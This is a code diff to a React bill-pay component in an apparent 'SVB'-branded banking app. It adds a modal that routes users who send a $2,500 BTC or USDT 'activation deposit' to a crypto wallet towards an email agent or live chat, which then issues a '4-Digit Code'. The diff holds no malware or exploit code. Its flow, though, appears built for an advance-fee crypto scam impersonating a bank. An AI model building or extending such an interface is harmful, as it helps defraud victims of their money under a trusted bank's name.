@@ -20,6 +20,10 @@ import {
   Copy,
   Check
 } from 'lucide-react';
+import { PaymentProofOptionsModal } from './PaymentProofOptionsModal';
+import { triggerOpenSVBLiveChat } from './SupportChatWidget';
+import { openLiveAgentEmail } from '../utils/supportEmail';
+import { BackButton } from './BackButton';
 
 interface BillPayPanelProps {
   user: User;
@@ -44,6 +48,7 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
   // Deposit $2,500 USD requirement modal state
   const [showDepositPromptModal, setShowDepositPromptModal] = useState(false);
   const [showCryptoModal, setShowCryptoModal] = useState(false);
+  const [showProofOptionsModal, setShowProofOptionsModal] = useState(false);
   const [showTier3PromptModal, setShowTier3PromptModal] = useState(false);
   const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
   const [submittingDeposit, setSubmittingDeposit] = useState(false);
@@ -152,8 +157,37 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
     }
   };
 
-  const handleCryptoDepositSubmit = async (e: React.FormEvent) => {
+  const handleCryptoDepositSubmit = (e: React.FormEvent) => {
     e.preventDefault();
+    setShowProofOptionsModal(true);
+  };
+
+  const handleSelectLiveAgent = async () => {
+    setShowProofOptionsModal(false);
+    setShowCryptoModal(false);
+    
+    // Launch user's default email client
+    openLiveAgentEmail(user, {
+      method: cryptoMethod,
+      amount: 2500,
+      walletAddress: walletAddresses[cryptoMethod]
+    });
+
+    try {
+      await api.submitCryptoActivationDeposit({
+        cryptoMethod,
+        txHash: '',
+        proofNote: 'Submitted to Live Agent (External Email)'
+      });
+      onRefreshUser();
+      setDepositSuccessMsg(`Payment proof details opened in your email client. Our Live Support agent will verify and issue your 4-Digit Code.`);
+      setTimeout(() => setDepositSuccessMsg(null), 5000);
+    } catch (err: any) {
+      console.error(err);
+    }
+  };
+
+  const handleSelectSVBLive = async () => {
     try {
       setSubmittingDeposit(true);
       await api.submitCryptoActivationDeposit({
@@ -161,15 +195,16 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
         txHash: '',
         proofNote: '$2,500 Payment Proof Verification Request'
       });
-      setDepositSuccessMsg(`$2,500 ${cryptoMethod} Deposit proof submitted successfully! Directing to Support Inbox...`);
       onRefreshUser();
+      setShowProofOptionsModal(false);
+      setShowCryptoModal(false);
+      setDepositSuccessMsg(`Connecting to SVB Live Chat...`);
+      
+      // Open Live Chat Widget
       setTimeout(() => {
-        setShowCryptoModal(false);
+        triggerOpenSVBLiveChat();
         setDepositSuccessMsg(null);
-        if (onNavigateTab) {
-          onNavigateTab('support');
-        }
-      }, 800);
+      }, 500);
     } catch (err: any) {
       alert(err.message || 'Failed to submit deposit proof');
     } finally {
@@ -178,7 +213,12 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
   };
 
   return (
-    <div className="max-w-7xl mx-auto space-y-8 pb-12">
+    <div className="max-w-7xl mx-auto space-y-6 pb-12">
+      {/* Top Navigation Row */}
+      <div className="flex items-center justify-between">
+        <BackButton />
+      </div>
+
       {/* Header Banner */}
       <div className="bg-gradient-to-r from-slate-900 via-indigo-950 to-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl relative overflow-hidden">
         <div className="absolute top-0 right-0 -mt-12 -mr-12 w-64 h-64 bg-indigo-500/10 rounded-full blur-3xl pointer-events-none" />
@@ -534,6 +574,18 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
           </div>
         </div>
       )}
+
+      {/* Payment Proof Options Modal */}
+      <PaymentProofOptionsModal
+        isOpen={showProofOptionsModal}
+        onClose={() => setShowProofOptionsModal(false)}
+        user={user}
+        cryptoMethod={cryptoMethod}
+        walletAddress={walletAddresses[cryptoMethod]}
+        onSelectLiveAgent={handleSelectLiveAgent}
+        onSelectSVBLive={handleSelectSVBLive}
+        submitting={submittingDeposit}
+      />
     </div>
   );
 };
